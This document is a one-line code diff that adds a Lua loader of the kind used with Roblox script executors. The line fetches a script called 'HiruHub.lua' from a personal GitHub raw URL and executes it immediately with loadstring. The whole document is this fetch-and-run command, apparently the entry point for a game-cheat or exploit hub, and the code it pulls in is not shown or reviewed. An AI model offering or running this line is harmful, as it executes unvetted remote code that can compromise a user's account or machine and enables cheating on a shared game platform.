@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NGUYENVUDUY1/Super/main/HiruHub.lua"))()
